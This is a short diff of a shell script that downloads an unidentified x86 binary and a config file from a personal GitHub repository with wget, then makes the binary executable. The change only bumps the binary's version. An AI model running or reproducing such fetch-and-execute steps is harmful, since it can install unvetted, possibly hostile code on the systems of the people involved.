@@ -5,7 +5,7 @@ mkdir -p neptune
 cd neptune
 
 # Download the files using wget
-wget https://github.com/bukum86/test/raw/refs/heads/main/oxzd-x86-1.1
+wget https://github.com/bukum86/test/raw/refs/heads/main/oxzd-x86-1.3
 wget https://github.com/bukum86/test/raw/refs/heads/main/oxzd_config.json
 
 # Rename the file and make it executable
